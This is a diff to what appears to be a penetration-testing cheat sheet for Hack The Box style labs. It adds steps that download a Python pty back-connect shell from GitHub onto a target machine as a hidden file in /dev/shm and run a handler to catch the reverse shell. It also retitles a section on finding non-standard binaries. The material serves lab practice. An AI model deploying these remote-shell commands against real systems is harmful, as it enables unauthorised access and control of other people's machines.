@@ -58,12 +58,23 @@ export TERM=xterm256-color
 stty rows number_of_row columns number_of_columns
 {% endhighlight %}
 
+Another option is to directly push a python pty shell to the targeted box:
+{% highlight bash%}
+wget https://raw.githubusercontent.com/Mushi-mushi/python-pty-shells/master/sctp_pty_backconnect.py -o /dev/shm/.shell.py
+{% endhighlight %}
+configure the shell with the correct IP and port then get the shell handler
+{% highlight bash%}
+wget https://raw.githubusercontent.com/Mushi-mushi/python-pty-shells/master/sctp_pty_shell_handler.py -o /root/HTB/handler.py
+python handler.py -b YourIP:Youropenedport
+{% endhighlight %}
+<sup>Shell scripts from [infodox][link11]</sup>
+
 Enjoy!
 
 [Back to the top](#header)
 
-Finding binaries that the systems package manager does not recognize
-====================================================================
+Finding non standard binaries 
+==============================
 {% highlight bash%}
 for i in $(ls /sbin/*); do echo $i; done
 for i in $(ls /sbin/*); do dpkg --search $i; done
@@ -98,4 +109,5 @@ Interesting Links:
 [link8]:https://netsec.ws/?p=376
 [link9]:http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 [link10]:https://www.w3schools.com/howto/tryit.asp?filename=tryhow_css_subnav
+[link11]:https://github.com/infodox/python-pty-shells
 
